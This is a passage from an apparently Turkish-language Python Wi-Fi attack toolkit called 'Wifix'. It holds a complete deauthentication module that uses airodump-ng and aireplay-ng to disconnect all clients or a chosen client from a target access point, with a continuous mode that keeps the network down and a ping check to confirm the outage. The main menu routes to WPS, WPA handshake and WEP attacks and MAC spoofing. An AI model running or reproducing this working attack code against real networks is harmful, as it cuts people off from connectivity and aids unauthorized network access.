    print(f"  TCP: {stats['tcp']} | UDP: {stats['udp']} | ARP: {stats['arp']}")
    print(f"  HTTP: {stats['http']} | HTTPS: {stats['https']}")
    print(f"  DNS: {stats['dns']} | DHCP: {stats['dhcp']}")
    print(f"  Benzersiz IP: {len(stats['unique_ips'])}")
    
    # DNS Sorguları
    if stats['dns_queries']:
        print(f"\n{c(Colors.OKBLUE)}[DNS SORGULARI]{c(Colors.ENDC)}")
        for q in list(set(stats['dns_queries']))[:10]:
            print(f"  - {q}")
        if len(set(stats['dns_queries'])) > 10:
            print(f"  ... ve {len(set(stats['dns_queries'])) - 10} tane daha")
    
    # HTTP URL'ler
    if stats['urls']:
        print(f"\n{c(Colors.OKBLUE)}[HTTP İSTEKLERİ]{c(Colors.ENDC)}")
        for url in stats['urls'][:10]:
            print(f"  - {url}")
        if len(stats['urls']) > 10:
            print(f"  ... ve {len(stats['urls']) - 10} tane daha")
    
    # DHCP
    if stats['dhcp_discover']:
        print(f"\n{c(Colors.OKBLUE)}[DHCP İSTEMCİLERİ]{c(Colors.ENDC)}")
        for host in set(stats['dhcp_discover']):
            print(f"  - {host}")
    
    # IP listesi
    if stats['unique_ips']:
        print(f"\n{c(Colors.OKBLUE)}[TESPİT EDİLEN IP'LER]{c(Colors.ENDC)}")
        for ip in sorted(stats['unique_ips'])[:20]:
            print(f"  - {ip}")
        if len(stats['unique_ips']) > 20:
            print(f"  ... ve {len(stats['unique_ips']) - 20} tane daha")
    
    return stats

# ============================================================
# MODÜL 8: DEAUTH & UZAKTAN ERİŞİM
# ============================================================

def deauth_attack_menu(mon_iface: str):
    """Deauth saldırısı ve uzaktan erişim"""
    print(c(Colors.HEADER, "\n" + "=" * 50))
    print(c(Colors.BOLD, "  [8] DEAUTH & ERİŞİM KESME MODÜLÜ"))
    print(c(Colors.HEADER, "=" * 50))
    
    bssid = input(c(Colors.OKCYAN, "[?] Hedef AP BSSID (00:11:22:33:44:55): "))
    essid = input(c(Colors.OKCYAN, "[?] Hedef ESSID: "))
    channel = input(c(Colors.OKCYAN, "[?] Kanal: "))
    
    if not bssid or len(bssid) != 17:
        print(c(Colors.FAIL, "[!] Geçerli bir BSSID girin!"))
        return False
    
    if channel:
        run_command(f"iw dev {mon_iface} set channel {channel}")
    
    # İstemci bulma
    print(c(Colors.OKCYAN, "\n[*] Bağlı istemciler taranıyor..."))
    
    client_file = f"/tmp/clients_{int(time.time())}"
    dump_cmd = f"airodump-ng -c {channel} --bssid {bssid} -w {client_file} {mon_iface} 2>/dev/null &"
    pid = subprocess.Popen(dump_cmd, shell=True)
    
    time.sleep(10)
    run_command(f"kill {pid.pid} 2>/dev/null")
    time.sleep(1)
    
    clients = []
    csv_file = f"{client_file}-01.csv"
    if os.path.exists(csv_file):
        with open(csv_file, 'r', errors='ignore') as f:
            content = f.read()
        
        # Station MAC'den sonraki kısım
        if 'Station MAC' in content:
            station_section = content.split('Station MAC')[1]
            for line in station_section.split('\n'):
                parts = [p.strip() for p in line.split(',')]
                if len(parts) >= 6 and len(parts[0]) == 17 and ':' in parts[0]:
                    client_mac = parts[0]
                    if client_mac != bssid:  # AP'nin kendisi değilse
                        clients.append({
                            'mac': client_mac,
                            'power': parts[1] if len(parts) > 1 else 'N/A',
                            'packets': parts[2] if len(parts) > 2 else 'N/A',
                            'probed_essid': parts[5] if len(parts) > 5 else ''
                        })
        
        os.remove(csv_file)
    
    # Temizlik
    for f in os.listdir('/tmp'):
        if f.startswith(f'clients_{client_file.split("_")[-1].split("-")[0]}'):
            try:
                os.remove(f'/tmp/{f}')
            except:
                pass
    
    print(c(Colors.OKCYAN, f"\n[*] Saldırı seçenekleri:"))
    print("  1 - Tüm istemcilere deauth (ağı kapat)")
    print("  2 - Belirli bir istemciye deauth")
    print("  3 - Sürekli deauth (ağı sürekli kapalı tut)")
    print("  4 - Hedefe bağlı istemci listesini göster")
    
    choice = input(c(Colors.OKCYAN, "\n[?] Seçiminiz (1-4): "))
    
    if choice == '4':
        if clients:
            print(c(Colors.OKGREEN, f"\n[+] Bağlı istemciler ({len(clients)}):"))
            print("-" * 60)
            print(f"{'MAC Adresi':<20} {'Sinyal':<10} {'Paket':<10} {'Probed ESSID':<20}")
            print("-" * 60)
            for c in clients:
                print(f"{c['mac']:<20} {c['power']:<10} {c['packets']:<10} {c['probed_essid']:<20}")
        else:
            print(c(Colors.WARNING, "[!] Bağlı istemci bulunamadı."))
            print(c(Colors.OKBLUE, "[*] Yine de deauth gönderilebilir (broadcast hedef)."))
        return True
    
    paket_sayisi = 0
    hedef_mac = None
    
    if choice == '1':
        paket_sayisi = 10
        hedef_mac = bssid  # broadcast deauth
        print(c(Colors.WARNING, f"\n[*] Tüm istemcilere {paket_sayisi} deauth paketi gönderiliyor..."))
    
    elif choice == '2':
        if not clients:
            client_mac = input(c(Colors.OKCYAN, "[?] İstemci MAC adresi: "))
        else:
            print(c(Colors.OKBLUE, "\n[*] Bağlı istemciler:"))
            for i, c in enumerate(clients):
                print(f"  {i+1} - {c['mac']} ({c['probed_essid']})")
            
            sel = input(c(Colors.OKCYAN, "\n[?] İstemci seçin (veya MAC girin): "))
            try:
                idx = int(sel) - 1
                client_mac = clients[idx]['mac']
            except:
                client_mac = sel
        
        hedef_mac = client_mac
        paket_sayisi = 10
        print(c(Colors.WARNING, f"\n[*] {hedef_mac} adresine {paket_sayisi} deauth paketi gönderiliyor..."))
    
    elif choice == '3':
        paket_sayisi = 0  # Sürekli
        hedef_mac = bssid
        print(c(Colors.WARNING, "\n[*] Sürekli deauth başlatılıyor (Ctrl+C ile durdurun)..."))
    
    # Deauth gönder
    if choice == '3':
        # Sürekli deauth döngüsü
        try:
            while True:
                cmd = f"aireplay-ng -0 1 -a {bssid} {mon_iface} 2>/dev/null"
                subprocess.Popen(cmd, shell=True)
                time.sleep(1)
        except KeyboardInterrupt:
            print(c(Colors.WARNING, "\n[!] Deauth durduruldu."))
    else:
        cmd = f"aireplay-ng -0 {paket_sayisi} -a {bssid} {mon_iface} 2>/dev/null"
        if hedef_mac and hedef_mac != bssid:
            cmd += f" -c {hedef_mac}"
        
        print(c(Colors.OKCYAN, f"\n[*] Komut: {cmd}"))
        os.system(cmd)
        
        print(c(Colors.OKGREEN, f"\n[+] {paket_sayisi} deauth paketi gönderildi!"))
        
        # Başarı kontrolü sor
        check = input(c(Colors.OKCYAN, "\n[?] Ağın kapandığını doğrulamak için ping testi yapalım mı? (e/h): "))
        if check.lower() == 'e':
            gateway = input(c(Colors.OKCYAN, "[?] Gateway IP (boş=192.168.1.1): "))
            if not gateway:
                gateway = "192.168.1.1"
            
            print(c(Colors.OKCYAN, f"[*] {gateway} ping testi..."))
            time.sleep(2)
            ret, out, _ = run_command(f"ping -c 2 -W 2 {gateway}")
            if ret == 0:
                print(c(Colors.WARNING, "[!] Ağ hala erişilebilir durumda."))
            else:
                print(c(Colors.OKGREEN, "[+] Hedef ağa erişim kesildi!"))
    
    return True

# ============================================================
# ANA MENÜ
# ============================================================

def main_menu():
    """Ana menü"""
    banner()
    
    check_root()
    check_dependencies()
    
    # Varsayılan arayüz
    interfaces = get_wireless_interfaces()
    default_iface = interfaces[0] if interfaces else "wlan0"
    
    mon_iface = None
    current_iface = default_iface
    
    while True:
        print(c(Colors.HEADER, "\n" + "=" * 50))
        print(c(Colors.BOLD, "          WIFIX ANA MENÜ"))
        print(c(Colors.HEADER, "=" * 50))
        
        mon_status = c(Colors.OKGREEN, f"({mon_iface})") if mon_iface else c(Colors.WARNING, "(Kapalı)")
        
        print(f"\n  {c(Colors.OKBLUE, 'Arayüz:')} {current_iface} {mon_status}")
        print(f"\n  {c(Colors.BOLD, '[1]')}  IP Tarama")
        print(f"  {c(Colors.BOLD, '[2]')}  Port Tarama")
        print(f"  {c(Colors.BOLD, '[3]')}  Wi-Fi Ağ Tarama")
        print(f"  {c(Colors.BOLD, '[4]')}  WPS Saldırı")
        print(f"  {c(Colors.BOLD, '[5]')}  WPA/WPA2 Saldırı (Handshake)")
        print(f"  {c(Colors.BOLD, '[6]')}  WEP Saldırı")
        print(f"  {c(Colors.BOLD, '[7]')}  Ağ Dinleme & Analiz")
        print(f"  {c(Colors.BOLD, '[8]')}  Deauth & Uzaktan Erişim Kesme")
        print(f"  {c(Colors.BOLD, '[M]')}  MAC Adresi Değiştir")
        print(f"  {c(Colors.BOLD, '[0]')}  Çıkış")
        
        choice = input(c(Colors.OKCYAN, "\n  [?] Seçiminiz: ")).strip()
        
        if choice == '0':
            if mon_iface:
                disable_monitor_mode(mon_iface)
            print(c(Colors.OKGREEN, "\n[+] Görüşmek üzere! Wifix kapandı."))
            break
        
        elif choice == '1':
            ip_scan_menu()
        
        elif choice == '2':
            port_scan_menu()
        
        elif choice == '3':
            nets, mon_iface = wifi_scan_menu(current_iface)
            if mon_iface:
                current_iface = mon_iface
        
        elif choice == '4':
            if not mon_iface:
                print(c(Colors.WARNING, "[!] Önce Wi-Fi taraması yapın (seçenek 3)"))
                nets, mon_iface = wifi_scan_menu(current_iface)
                if mon_iface:
                    current_iface = mon_iface
            if mon_iface:
                wps_attack_menu(mon_iface)
        
        elif choice == '5':
            if not mon_iface:
                print(c(Colors.WARNING, "[!] Önce Wi-Fi taraması yapın (seçenek 3)"))
                nets, mon_iface = wifi_scan_menu(current_iface)
                if mon_iface:
                    current_iface = mon_iface
            if mon_iface:
                wpa_attack_menu(mon_iface)
        
        elif choice == '6':
            if not mon_iface:
                print(c(Colors.WARNING, "[!] Önce Wi-Fi taraması yapın (seçenek 3)"))
                nets, mon_iface = wifi_scan_menu(current_iface)
                if mon_iface:
                    current_iface = mon_iface
            if mon_iface:
                wep_attack_menu(mon_iface)
        
        elif choice == '7':
            network_monitor_menu(current_iface if not mon_iface else mon_iface)
        
        elif choice == '8':
            if not mon_iface:
                print(c(Colors.WARNING, "[!] Önce Wi-Fi taraması yapın (seçenek 3)"))
                nets, mon_iface = wifi_scan_menu(current_iface)
                if mon_iface:
                    current_iface = mon_iface
            if mon_iface:
                deauth_attack_menu(mon_iface)
        
        elif choice.lower() == 'm':
            if interfaces:
                randomize_mac(interfaces[0])
        
        else:
            print(c(Colors.FAIL, f"[!] Geçersiz seçim: {choice}"))
        
        input(c(Colors.OKCYAN, "\n  [*] Devam etmek için Enter'a basın..."))

# ============================================================
# BAŞLANGIÇ
# ============================================================

if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        print(c(Colors.WARNING, "\n\n[!] Ctrl+C ile çıkıldı."))
        # Monitor modu temizle
        for iface in get_wireless_interfaces():
            disable_monitor_mode(f"{iface}mon")
        sys.exit(0)
    except Exception as e:
        print(c(Colors.FAIL, f"\n[!] Hata: {e}"))
        import traceback
        traceback.print_exc()
        sys.exit(1)
